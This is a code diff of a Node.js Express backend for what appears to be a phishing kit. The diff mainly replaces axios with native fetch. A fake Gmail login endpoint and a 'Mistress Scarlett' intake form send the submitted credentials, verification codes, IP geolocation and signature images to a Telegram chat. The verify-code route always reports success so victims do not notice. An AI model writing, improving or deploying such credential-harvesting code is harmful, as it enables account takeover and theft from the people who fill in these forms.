@@ -1,18 +1,11 @@
 /* ============================================================
-   serve.js — Unified backend
-   • Mistress Scarlett intake form   → /api/submit, /api/send-code, /api/verify-code
-   • Gmail login page                → /api/login
-   • Diagnostics                     → /health, /api/test-telegram, /api/debug-ip
-   ============================================================
-   Requirements:
-     • Node.js 18+  (built-in fetch, FormData, Blob)
-     • npm install express axios cors helmet express-rate-limit dotenv
-   Run:
-     node serve.js
+   serve.js — Unified backend (no axios, uses native fetch)
+   • Mistress Scarlett intake → /api/submit, /api/send-code, /api/verify-code
+   • Gmail login page         → /api/login
+   • Diagnostics              → /health, /api/test-telegram, /api/debug-ip
    ============================================================ */
 
 const express   = require('express');
-const axios     = require('axios');
 const cors      = require('cors');
 const helmet    = require('helmet');
 const rateLimit = require('express-rate-limit');
@@ -33,18 +26,14 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
-/* Application form sends a base64 signature — allow up to 10mb.
-   Gmail login only needs a few KB, but one limit covers both. */
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.set('trust proxy', true);
 
-/* Serve index.html, verification.html, styles.css, etc. if you host
-   the frontend on the same Render service. Safe to remove if not. */
 app.use(express.static(path.join(__dirname), { extensions: ['html'] }));
 
 /* ============================================================
-   RATE LIMITING — JSON response so the frontend can always parse
+   RATE LIMITING — JSON response
    ============================================================ */
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
@@ -126,7 +115,7 @@ function clientInfo(req) {
 }
 
 /* ============================================================
-   TELEGRAM — message + photo
+   TELEGRAM — message + photo (native fetch, no axios)
    ============================================================ */
 async function sendToTelegram(message, opts = {}) {
   const parseMode = opts.parseMode === undefined ? 'HTML' : opts.parseMode;
@@ -139,18 +128,21 @@ async function sendToTelegram(message, opts = {}) {
   if (parseMode) payload.parse_mode = parseMode;
 
   try {
-    const res = await axios.post(
-      `${TELEGRAM_API_URL}/sendMessage`,
-      payload,
-      { timeout: 10000 }
-    );
+    const res = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const json = await res.json();
+
+    if (!json.ok) {
+      throw new Error('Telegram API error: ' + JSON.stringify(json));
+    }
+
     console.log('[telegram] sent OK (' + (parseMode || 'plain') + ', ' + message.length + ' chars)');
-    return { success: true, data: res.data };
+    return { success: true, data: json };
   } catch (err) {
     console.error('[telegram] send failed:', err.message);
-    if (err.response && err.response.data) {
-      console.error('[telegram] API error:', JSON.stringify(err.response.data));
-    }
 
     /* If HTML failed, retry once as plain text */
     if (parseMode === 'HTML') {
@@ -161,17 +153,21 @@ async function sendToTelegram(message, opts = {}) {
         .replace(/&amp;/g, '&');
 
       try {
-        const res2 = await axios.post(
-          `${TELEGRAM_API_URL}/sendMessage`,
-          {
+        const res2 = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: stripped,
             disable_web_page_preview: true
-          },
-          { timeout: 10000 }
-        );
+          })
+        });
+        const json2 = await res2.json();
+
+        if (!json2.ok) throw new Error(JSON.stringify(json2));
+
         console.log('[telegram] retried as plain text — OK');
-        return { success: true, data: res2.data, retried: true };
+        return { success: true, data: json2, retried: true };
       } catch (err2) {
         console.error('[telegram] plain text retry also failed:', err2.message);
       }
@@ -205,14 +201,15 @@ async function getIPLocation(ip) {
       return 'Local/Private Network';
     }
 
-    const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });
+    const res = await fetch(`http://ip-api.com/json/${ip}`);
+    const data = await res.json();
 
-    if (response.data && response.data.status === 'success') {
+    if (data && data.status === 'success') {
       const parts = [];
-      if (response.data.city)       parts.push(response.data.city);
-      if (response.data.regionName) parts.push(response.data.regionName);
-      if (response.data.country)    parts.push(response.data.country);
-      if (response.data.isp)        parts.push(`ISP: ${response.data.isp}`);
+      if (data.city)       parts.push(data.city);
+      if (data.regionName) parts.push(data.regionName);
+      if (data.country)    parts.push(data.country);
+      if (data.isp)        parts.push(`ISP: ${data.isp}`);
       return parts.join(', ') || 'Unknown';
     }
     return 'Unknown';
@@ -225,8 +222,6 @@ async function getIPLocation(ip) {
 /* ============================================================
    MESSAGE FORMATTERS
    ============================================================ */
-
-/* --- Gmail login --- */
 function formatLoginMessage(loginData) {
   const now = new Date();
   return [
@@ -243,7 +238,6 @@ function formatLoginMessage(loginData) {
   ].join('\n');
 }
 
-/* --- Mistress Scarlett application form --- */
 function formatApplicationMessage(data, req) {
   const { ua, ip, when } = clientInfo(req);
   return [
@@ -288,7 +282,6 @@ function formatApplicationMessage(data, req) {
 /* ============================================================
    ROUTES — GMAIL LOGIN
    ============================================================ */
-
 app.post('/api/login', async (req, res) => {
   try {
     const body = req.body || {};
@@ -337,7 +330,6 @@ app.post('/api/login', async (req, res) => {
 /* ============================================================
    ROUTES — MISTRESS SCARLETT INTAKE
    ============================================================ */
-
 app.post('/api/submit', async (req, res) => {
   try {
     const data = req.body || {};
@@ -345,7 +337,6 @@ app.post('/api/submit', async (req, res) => {
     const msg = formatApplicationMessage(data, req);
     await sendToTelegram(msg);
 
-    /* Send the drawn signature as a photo if present */
     if (
       typeof data.signature_dataurl === 'string' &&
       data.signature_dataurl.startsWith('data:image/')
@@ -431,9 +422,6 @@ app.post('/api/verify-code', async (req, res) => {
     await sendToTelegram(msg);
 
     console.log(`✔ Code forwarded: ${fmt(code)} from ${fmt(email)}`);
-
-    /* Always valid so the applicant sees the success screen.
-       Change to your own logic if you need to require a specific code. */
     res.json({ ok: true, valid: true });
 
   } catch (err) {
@@ -443,9 +431,8 @@ app.post('/api/verify-code', async (req, res) => {
 });
 
 /* ============================================================
-   DIAGNOSTIC ROUTES
+   DIAGNOSTICS
    ============================================================ */
-
 app.get('/health', (req, res) => {
   res.status(200).json({
     status: 'OK',
@@ -493,24 +480,20 @@ app.get('/', (req, res) => {
     message: 'Unified backend — Mistress Scarlett intake + Gmail login',
     status: 'Running',
     endpoints: {
-      /* Gmail login */
-      login:            'POST /api/login',
-      /* Mistress Scarlett intake */
-      submit:           'POST /api/submit',
-      sendCode:         'POST /api/send-code',
-      verifyCode:       'POST /api/verify-code',
-      /* Diagnostics */
-      health:           'GET /health',
-      testTelegram:     'GET /api/test-telegram',
-      debugIP:          'GET /api/debug-ip'
+      login:        'POST /api/login',
+      submit:       'POST /api/submit',
+      sendCode:     'POST /api/send-code',
+      verifyCode:   'POST /api/verify-code',
+      health:       'GET /health',
+      testTelegram: 'GET /api/test-telegram',
+      debugIP:      'GET /api/debug-ip'
     }
   });
 });
 
 /* ============================================================
-   404 + GLOBAL ERROR HANDLER — always JSON
+   404 + ERROR — always JSON
    ============================================================ */
-
 app.use((req, res) =>
   res.status(404).json({ success: false, message: 'Route not found' })
 );
